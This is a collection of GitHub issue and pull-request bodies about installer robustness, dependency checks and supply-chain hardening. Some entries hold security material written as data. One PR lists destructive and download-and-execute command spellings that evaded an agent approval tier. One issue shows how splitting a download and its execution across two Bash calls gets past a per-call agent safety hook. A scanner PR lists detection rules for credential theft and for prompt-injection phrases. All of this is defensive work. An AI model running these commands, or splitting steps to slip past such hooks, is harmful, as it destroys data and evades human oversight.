items.title: [C3] Re-install is not atomic: a failed fetch deletes the working launcher and can leave truncated runtime modules
items.body:
## Summary
`setup_splitscreen_launcher_script` (`modules/runtime_deploy.sh:65-83`) downloads straight onto the live `$TARGET_DIR/minecraftSplitscreen.sh` and, when the result is not a script, `rm -f`s it. `install_runtime_modules` (`:170-185`) likewise `cp`/`fetch_url`s each module directly to `$TARGET_DIR/modules/<mod>`. `curl -o` truncates its target before the transfer starts, so a 404 (bad `REPO_REF`), a mid-transfer drop, or a `--max-time` expiry replaces a previously working install with an empty launcher (then deleted) and/or a partial module, and the installer aborts (`main_workflow.sh:172-173`) leaving the Steam shortcut pointing at nothing.

## Evidence
```bash
# runtime_deploy.sh:72-82
fetch_url "$remote_script" "$launcher_script" || true
...
if [[ ! -s "$launcher_script" ]] || ! head -n1 "$launcher_script" | grep -q '^#!'; then
    ...
    rm -f "$launcher_script" 2>/dev/null || true
    return 1
```
Reproduced (fixture: a working launcher + `modules/orchestrator.sh` under `TARGET_DIR`; `fetch_url` stubbed to write an empty file / a truncated body and fail):
```
== ORIGINAL
[FAIL] T7.22a launcher was ls: cannot access '.../PolyMC/minecraftSplitscreen.sh': No such file
[FAIL] T7.22b: # TRUNC   (live orchestrator.sh now holds the partial body; watchdog.sh appeared empty)
== PATCHED
[PASS] T7.22a failed launcher fetch leaves the working launcher in place
[PASS] T7.22b failed module download leaves live modules untouched
[PASS] T7.22c no staging leftovers
```

## Failure scenario
`REPO_REF=typo ./install-minecraft-splitscreen.sh` (or `curl … | bash` on a Wi-Fi that drops at 30%) on a Deck with a working v1.2 install → the launcher is removed and/or `orchestrator.sh` is truncated, the installer prints "Failed to install the splitscreen launcher — aborting", and the Steam shortcut now fails to start with no pointer to the cause.

## Suggested fix
```diff
--- a/modules/runtime_deploy.sh
+++ b/modules/runtime_deploy.sh
@@ -62,27 +62,38 @@
     local local_script="${SCRIPT_DIR:-}/minecraftSplitscreen.sh"
     local remote_script="${MCSS_REPO_RAW_URL}/minecraftSplitscreen.sh"
 
+    # C3: fetch into a temp file NEXT TO the target (same filesystem, so the
+    # final mv is atomic) and only move it over the live launcher once it
+    # validates. curl -o truncates its output before the transfer starts, so
+    # a 404 (bad REPO_REF), a mid-transfer drop, or a --max-time expiry used
+    # to replace a WORKING launcher with an empty/partial one — and the
+    # rm -f below then deleted it outright (STYLE-GUIDE §7.9 tmp + mv).
+    local staged
+    staged=$(mktemp "$TARGET_DIR/.minecraftSplitscreen.sh.XXXXXX") || return 1
     if [[ -f "$local_script" ]]; then
-        cp "$local_script" "$launcher_script"
+        cp "$local_script" "$staged"
     else
         # Fix #51 (D14): fetch_url replaces the curl/wget/neither chain.
         # It prints its own error when no downloader is installed; any
         # fetch failure falls through to the -s/shebang check below,
         # which reports the detailed fatal error.
-        fetch_url "$remote_script" "$launcher_script" || true
+        fetch_url "$remote_script" "$staged" || true
     fi
 
     # The launcher IS the product — fail loudly if the fetch didn't produce a real script
     # (e.g. a 404 from a ref that doesn't have it), instead of chmod-ing an empty file and
-    # letting the installer report success downstream.
-    if [[ ! -s "$launcher_script" ]] || ! head -n1 "$launcher_script" | grep -q '^#!'; then
-        print_error "Launcher fetch failed: $launcher_script is missing/empty or not a script"
+    # letting the installer report success downstream. A previously installed
+    # launcher is left exactly as it was.
+    if [[ ! -s "$staged" ]] || ! head -n1 "$staged" | grep -q '^#!'; then
+        print_error "Launcher fetch failed: fetched minecraftSplitscreen.sh is missing/empty or not a script"
         print_info "  (tried: ${local_script:-<none>} then ${remote_script})"
-        rm -f "$launcher_script" 2>/dev/null || true
+        [[ -f "$launcher_script" ]] && print_info "  existing $launcher_script left untouched"
+        rm -f "$staged" 2>/dev/null || true
         return 1
     fi
 
-    chmod +x "$launcher_script"
+    chmod +x "$staged"
+    mv -f "$staged" "$launcher_script"
 
     # Stamp build provenance into the deployed copy (version / commit / date).
     # The launcher carries __MCSS_*__ placeholders; replace them here. A failure
@@ -132,6 +143,13 @@
     local dest_dir="$TARGET_DIR/modules"
     mkdir -p "$dest_dir"
 
+    # C3: stage every module into a sibling temp dir and move the set into
+    # place only after ALL of them landed, so a failed/partial download can
+    # never leave a truncated module in the live tree (curl -o truncates
+    # its target before transferring).
+    local stage_dir
+    stage_dir=$(mktemp -d "$TARGET_DIR/.modules.XXXXXX") || return 1
+
     local base_url="${MCSS_REPO_RAW_URL}/modules"
 
     # #49: the module list comes from the ONE manifest (runtime_modules.list) —
@@ -146,29 +164,31 @@
         manifest_src="$SCRIPT_DIR/modules/$manifest"
     else
         # Fix #51 (D14): fetch_url replaces the curl/wget branches.
-        fetch_url "$base_url/$manifest" "$dest_dir/$manifest" \
+        fetch_url "$base_url/$manifest" "$stage_dir/$manifest" \
             2>/dev/null || true
-        [[ -s "$dest_dir/$manifest" ]] && manifest_src="$dest_dir/$manifest"
+        [[ -s "$stage_dir/$manifest" ]] && manifest_src="$stage_dir/$manifest"
     fi
     if [[ -z "$manifest_src" ]]; then
         print_error "$manifest not found (MODULES_DIR, repo checkout, or download) — cannot install runtime modules"
+        rm -rf "$stage_dir"
         return 1
     fi
     local runtime_mods=()
     mapfile -t runtime_mods < <(read_runtime_manifest "$manifest_src")
     if [[ ${#runtime_mods[@]} -eq 0 ]]; then
         print_error "$manifest is empty — refusing to deploy a launcher with no runtime modules"
+        rm -rf "$stage_dir"
         return 1
     fi
     # Deploy the manifest itself alongside the modules: the launcher reads it
     # at startup to know what to source.
-    if [[ "$manifest_src" != "$dest_dir/$manifest" ]]; then
-        cp "$manifest_src" "$dest_dir/$manifest"
+    if [[ "$manifest_src" != "$stage_dir/$manifest" ]]; then
+        cp "$manifest_src" "$stage_dir/$manifest"
     fi
 
     local failed=0
     for mod in "${runtime_mods[@]}"; do
-        local dest="$dest_dir/$mod"
+        local dest="$stage_dir/$mod"
         # 1. Already in the temp modules dir (most common path)
         if [[ -n "${MODULES_DIR:-}" && -f "$MODULES_DIR/$mod" ]]; then
             cp "$MODULES_DIR/$mod" "$dest"
@@ -184,7 +204,6 @@
             continue
         fi
         chmod +x "$dest"
-        print_success "Runtime module installed: $dest"
     done
 
     if (( failed > 0 )); then
@@ -192,9 +211,19 @@
         print_info "The launcher (minecraftSplitscreen.sh) will fail to start without them."
         print_info "Re-run the installer or manually copy modules/ from the repository to:"
         print_info "  $dest_dir"
+        print_info "  (existing modules under $dest_dir were left untouched)"
+        rm -rf "$stage_dir"
         return 1
     fi
 
+    # Every module validated — swap the staged set into the live tree.
+    local staged_file
+    for staged_file in "$stage_dir"/*; do
+        mv -f "$staged_file" "$dest_dir/${staged_file##*/}"
+        print_success "Runtime module installed: $dest_dir/${staged_file##*/}"
+    done
+    rmdir "$stage_dir" 2>/dev/null || true
+
     print_success "All runtime orchestrator modules installed to $dest_dir"
     return 0
 }
```
Both writers now stage under `$TARGET_DIR` (same filesystem, so each `mv -f` is an atomic rename) and touch the live tree only after validation — the launcher after the `-s`/shebang check, the modules only once every one of them landed. Every early `return 1` removes its staging dir, so a failed run leaves no `.modules.*` litter. The three-tier source fallback, the manifest-is-fatal rule (#49), the stamp step and the return contracts are unchanged; a pre-existing module that is no longer in the manifest is still left in place (as before). Note `mktemp` creates the staged launcher 0600, so after `chmod +x` it is 0700 rather than the previous umask-derived 0755 — the launcher is only ever run by the installing user (Steam launches it as that user), so this is harmless; use `chmod 755` if a shared-machine layout ever matters.

Verification done: (a) `bash -n`; (b) `git apply --check` from the repo root; (c) `tests/test_installer.sh` 17/17 on a scratch clone with the patched file (T7.7, the module-deploy test, still passes through the staging path); the fixture test below is green on the patch and red on the original.

## Tests
Add `test_t7_22` to `tests/test_installer.sh`: create `$TARGET_DIR/minecraftSplitscreen.sh` (`#!/bin/bash\necho WORKING`) and `$TARGET_DIR/modules/orchestrator.sh`; (a) with `SCRIPT_DIR=/nonexistent` and `fetch_url() { : > "$2"; return 22; }` call `setup_splitscreen_launcher_script` (expect return 1) and assert the working launcher still contains `WORKING`; (b) with a two-line manifest and `fetch_url() { printf '#!/bin/bash\n# TRUNC' > "$2"; return 18; }` call `install_runtime_modules` (expect return 1) and assert `orchestrator.sh` is unchanged and `watchdog.sh` does not exist; (c) assert no `.modules.*`/`.minecraftSplitscreen.sh.*` entries remain under `$TARGET_DIR`.

Mutation (PRINCIPLES #4): change `staged`/`stage_dir` back to the live paths — (a) and (b) go red; drop one `rm -rf "$stage_dir"` — (c) goes red. Confirmed in this session.

## Hardware verification
Desktop mode on a Deck with a working install: `cp -r ~/.local/share/PolyMC/modules /tmp/mods.bak`, then `REPO_REF=does-not-exist ./install-minecraft-splitscreen.sh --yes`. Expect "Launcher fetch failed … existing …/minecraftSplitscreen.sh left untouched" and a non-zero exit; then `diff -r /tmp/mods.bak ~/.local/share/PolyMC/modules` must be empty and `~/.local/share/PolyMC/minecraftSplitscreen.sh --version` must still print the previous stamp. Finally launch the Steam shortcut (Game Mode, 1 pad) to prove the old install still runs. Stage: `tests/hardware/run_all.sh stage0b`.

## References
Review C3 (docs/reviews/2026-09-28/C-installer-mods.md; consolidated §4 "Installer / uninstaller / deploy / ops", fix-order item 5). STYLE-GUIDE §7.9 (atomic writes via tmp + mv). PRINCIPLES #5 (a failed detection/fetch must degrade to keep-last-good, never tear down). Related: #49 (manifest-driven module list), #91 (this module's split from launcher_setup.sh), C33 (module download timeout — pairs with this). Tracking: #200.

items.title: fix(mcp): rate destructive shell spellings CRITICAL, not just eight literal strings

labels.name: changes requested
labels.description: Review changes must be addressed before merge

items.body:
## The gap

`DefaultMcpRiskEvaluator` rates every shell tool (`run_command`, `run_in_panel`, `terminal_exec`, `open_terminal`, ...) HIGH, and CRITICAL when the command "contains a potentially destructive pattern". That pattern check was **eight literal substrings**:

```
rm -rf   del /s   format    mkfs   git push --force   git push -f   dd if=   chmod -r 777
```

CRITICAL matters because it is the tier a standing "Always Allow" on a shell tool does not cover (the approval path re-asks for it; #903 extends that to ALLOW paths). So any spelling those substrings did not contain rated a data-destroying command as plain HIGH, and once an operator had granted a standing allow on `run_command` it ran without a question:

| Command | Was | Now |
|---|---|---|
| `rm -fr ~/project`, `rm -r -f x`, `rm --recursive --force x` | HIGH | CRITICAL |
| `\rm -rf x`, `r''m -rf x`, `"rm" -rf x` | HIGH | CRITICAL |
| `sudo -n env FOO=1 rm -fr x`, `xargs rm -fr`, `ls; rm -fr x`, `$(rm -fr x)` | HIGH | CRITICAL |
| `git reset --hard`, `git clean -fdx`, `git push origin +main`, `git push origin --delete x`, `git push --force-with-lease` | HIGH | CRITICAL |
| `find . -delete`, `shred`, `wipefs`, `dd of=/dev/sda`, `echo x > /dev/sda`, fork bomb, `chown -R nobody /` | HIGH | CRITICAL |
| `Remove-Item -Recurse -Force`, `rd /s /q`, `del /f /q`, `diskpart`, `cipher /w` | HIGH | CRITICAL |
| `curl ... \| sh`, `wget -qO- ... \| bash`, `iwr ... \| iex`, `bash <(curl ...)`, `sh -c "$(curl ...)"` | HIGH | CRITICAL |

## Fix

The heuristic moves out of the evaluator into `DestructiveShellCommands` (its own commit, behavior-neutral) and stops being substring matching:

1. The line is split into **simple commands** on `; & | newline ( ) { }` and the backtick, so `a && b`, pipelines and `$(...)` are each seen.
2. Quotes, backslashes and carets are dropped, because they are how `\rm`, `r''m` and `"rm"` still run `rm`.
3. The **command word** is found past `sudo`, `doas`, `env`, `nice -n 10`, `xargs -0`, `timeout 5`, a leading `FOO=1` and friends, and reduced to its basename (`/bin/rm`, `rm.exe`).
4. Its **flags are read as flags**: `-r`, `-fr`, `-rfv`, `--recursive`; git's global options (`-C dir`) are skipped to reach the subcommand; a `+refspec` or `:branch` is a forced or deleting push.
5. Download-into-interpreter and `iex` remote execution are matched as their own shapes.

**Every legacy wording still matches** (pinned by a test), so nothing that was CRITICAL is lowered.

## Direction of error

This is a wording heuristic, not a shell parser, and the KDoc says so. Its errors are deliberately one-sided: a false positive is one extra approval prompt, a false negative is an unreviewed `rm -rf ~`. The evaluator lowercases its input, so `-R`/`-r` and `-D`/`-d` are indistinguishable; the rules are written so none of them depends on that difference (which is why `git branch -D` is not in the list). Ordinary commands stay HIGH and are pinned: `rm file.txt`, `rm -f file.txt`, `git push origin main`, `git reset --soft`, `git clean -n`, `find . -name x`, `chmod +x`, `curl -o out.json ...`, `curl ... | jq .`, `Get-ChildItem -Recurse`, `dir /s`, `del file.txt`.

## Tests

`DestructiveShellCommandsTest` (9): 7 of them **fail on the legacy substring matching** (the run before the change: 7 failed, the 2 passing ones pin legacy wording and ordinary commands) and pass after. Groups: rm flag spellings and wrappers, quoting and escaping, git, disk and file wiping, Windows, download-into-interpreter, all legacy wordings preserved, ordinary commands not flagged, and an end-to-end check that four shell tools rate the new spellings CRITICAL through the real evaluator.

The existing `McpRiskEvaluatorTest` contract pins (#842) are unchanged and green. `ktlintCheck` and `detekt` clean.

items.title: Linux CLI fails to load without PipeWire, even for read-only commands
items.body:
The published `minutes-linux-x64` binary links `libpipewire-0.3.so.0` at load time, so it exits before running anything when that library is absent:

```
minutes: error while loading shared libraries: libpipewire-0.3.so.0: cannot open shared object file
```

This happens for read-only commands too, including `minutes agent-readiness --json`, which every `minutes-mcp` read tool calls first. So on a headless box without audio, `list_meetings`, `search_meetings` and `track_commitments` all fail with "Minutes agent readiness could not be verified safely", and the cause is invisible from the MCP error.

Reproduce on a clean Ubuntu 24.04 container:

```
curl -sL -o minutes https://github.com/silverstein/minutes/releases/latest/download/minutes-linux-x64
chmod +x minutes && ./minutes --version      # fails
apt-get install -y libpipewire-0.3-0t64
./minutes --version                          # works
```

Found while testing whether the Minutes MCP server runs inside Meta Muse's agent VM (Ubuntu 24.04, Node 24), where read-only use is the whole point and audio capture is meaningless.

Suggested fixes, in order of preference:

1. Load the audio backend on demand so commands that never record don't need it.
2. Publish a headless or read-only Linux build.
3. At minimum, have `agent-readiness` report the real cause so the MCP error names the missing library.

items.title: D20 download-then-run correlation is per-call: splitting it across two Bash calls allows both, and nothing emitted says so
items.body:
## Summary

The download-then-run rule (D20, which closed J-10) matches only when both
halves appear in **one** Bash call. If the same steps are split across two tool
calls, both calls are allowed. No emitted artifact says this.

- The J-10 closure says the rule "needs BOTH halves in the same command".
- The J-10 row originally declined the fix because correlating the halves is
  "state the gate does not have".
- The draft `docs/threat-model.md` §4 says only that download-then-execute
  "variants" are "not reliably caught". That document is not emitted.

## Measured

- Trees: 2.6.1 and `0e6108c` (2.8.0).
- Every `PreToolUse` Bash hook was run on each payload separately:
  spec-gate-commit, secrets-gate, test-gate, dependency-gate and ci-mirror.
  Nothing was fetched or run.

| call | payload | rc (all five hooks) |
|---|---|---|
| 1 | `curl -sSL -o /tmp/x.sh https://example.invalid/x.sh` | 0 |
| 2 | `bash /tmp/x.sh` | 0 |
| 2′ | `sh /tmp/x.sh` | 0 |
| 2″ | `chmod +x /tmp/x.sh && /tmp/x.sh` | 0 |
| control | calls 1 and 2 joined with `;` | dependency-gate 2 |

## Severity

Under the stated threat model (an agent making a mistake), this is reachable
by accident. An agent that follows a README naturally runs "download the
installer" and "run it" as separate tool calls.

The control fails open for every split spelling. This is a structural limit of
a stateless per-call hook, not a spelling gap, so it needs one of these:

1. **Disclosure (T1).** State the limit in the emitted `deps.md` or
   `secrets.md` and in the README.
2. **A session-scoped write ledger.** For example,
   `.claude/sessions/.dl-<session_id>`, holding canonicalized paths that D20
   recorded from downloader writes. The run-side pass would also consult it,
   and a `SessionStart` or `Stop` hook would clear it. The ledger must fail
   closed on read errors.

Found by the first consumer (BracketBlitz-Gleam), 2026-09-17.

items.title: feat: add agent-safety rules to security scan
items.body:
## Why

The scanner covered secrets and private paths. But skills are **instructions an agent executes**, so the larger threat class is hostile content: remote code execution, credential exfiltration, destructive commands, and instructions aimed at the agent rather than the reader.

Generic SCA services (Snyk, Socket) don't cover this — and this repo has no dependency manifest for them to scan anyway. skills.sh runs those three providers registry-side, but only on indexed skills; this repo isn't indexed yet (indexing is driven by install telemetry, no self-serve submit flow).

## What

8 rules added to the existing `RULES` list:

| Rule | Catches |
|---|---|
| `pipe-to-shell` | `curl … \| sh` |
| `eval-remote-code` | `eval "$(curl …)"` |
| `dangerous-rm` | `rm -rf ~` / `/` / `$HOME` |
| `world-writable-chmod` | `chmod 777` |
| `credential-file-read` | `~/.ssh/id_*`, `~/.aws/credentials`, `.npmrc`, `.gnupg`, docker config |
| `credential-exfiltration` | curl/wget POSTing `$*_TOKEN`, `.env`, `id_rsa` |
| `prompt-injection` | "ignore all previous instructions" and variants |
| `hidden-from-user` | "do not tell the user", "without informing the user" |

## Verification

Patterns tuned against benign usage already in the repo — `curl -o out.json`, `rm -rf ./build`, `chmod +x`, the `yt-dlp` pipe in `ingest-link`. Repo baseline is clean; both scans pass.

New `--selftest` flag asserts each rule matches a known-bad sample *and* misses those benign lines. Runs as its own CI step before the scan, so a regex that silently stops matching fails the build instead of passing quietly.

```
$ python3 scripts/security_scan.py --selftest
Self-test passed for 8 agent-safety rules.
$ python3 scripts/security_scan.py
Public-safety scan passed for repo.
```

## Not included

- GitHub secret scanning + push protection (repo settings, 2 clicks)
- Local pre-commit hook install — `.pre-commit-config.yaml` exists but the `pre-commit` CLI isn't installed and `.git/hooks/pre-commit` is absent, so today only CI enforces this

items.title: Add SHA256 checksum verification for cuenv binary downloads
items.body:
## Summary

The CI stage contributors download the cuenv binary from GitHub Releases without checksum verification. This was identified during PR #251 code review as a security improvement.

## Current Behavior

`contrib/stages/cuenv.cue` downloads the binary via curl without verification:
```bash
curl -sSL -o /usr/local/bin/cuenv https://github.com/cuenv/cuenv/releases/latest/download/cuenv-linux-x64
chmod +x /usr/local/bin/cuenv
```

## Infrastructure Requirements

To implement checksum verification, we need:

1. **Publish checksums with releases** - Generate and upload SHA256 checksum files (e.g., `cuenv-linux-x64.sha256`) alongside binaries during the release workflow

2. **Update download commands** - Modify the CUE contributors to:
   - Download the checksum file
   - Verify the binary with `sha256sum -c` or equivalent
   - Fail the build if verification fails

3. **Cross-platform support** - Ensure verification works on:
   - Linux (sha256sum)
   - macOS (shasum -a 256)

## Example Implementation

```bash
curl -sSL -o /usr/local/bin/cuenv https://github.com/cuenv/cuenv/releases/latest/download/cuenv-linux-x64
curl -sSL -o /tmp/cuenv.sha256 https://github.com/cuenv/cuenv/releases/latest/download/cuenv-linux-x64.sha256
cd /usr/local/bin && sha256sum -c /tmp/cuenv.sha256
chmod +x /usr/local/bin/cuenv
```

## References

- PR #251 code review feedback
- `contrib/stages/cuenv.cue` contains TODO marker

items.title: fix(ci): stop fetching and executing remote getbtpcli in the BTP action image
items.body: ## Summary The BTP action image built `getbtpcli` straight off a mutable branch ref and ran it during `docker build`, so whatever that ref points at executes unverified inside the image build: ```dockerfile RUN curl -s -O --url ".../sap-tech-bytes/2021-09-01-btp-cli/getbtpcli" && chmod +x getbtpcli && echo | ./getbtpcli ``` The remote script is now gone. `.github/actions/btp/install-btp-cli.sh` is vendored in the repo and `COPY`ed in, so no remote code is fetched or executed at build time — only the btp CLI tarball itself is downloaded, from SAP's official host (same URL and EULA cookie the upstream script used), over `--proto '=https' --tlsv1.2 --fail`, and installed to `/usr/local/bin/btp`. Integrity: the download is checked against the digest in `.github/actions/btp/btp-cli.sha256`. GitHub does not let a Docker-action build receive build args, so the digest has to live in the repo; since the default `BTP_CLI_VERSION=latest` is a moving artifact, the file ships with only instructions and no digest, and the install logs a warning when unverified. Pinning a concrete `BTP_CLI_VERSION` in the Dockerfile plus its `sha256sum` in that file turns the check on and makes a mismatch fail the build. Verified offline (npm registry and raw.githubusercontent.com are unreachable from this session, so the image itself was not built): the script was exercised with a stub `curl`/`install` and a synthetic tarball across all three paths — no digest (warns, installs), matching digest (`Verified ... against pinned digest`, exit 0), mismatched digest (exit 1).
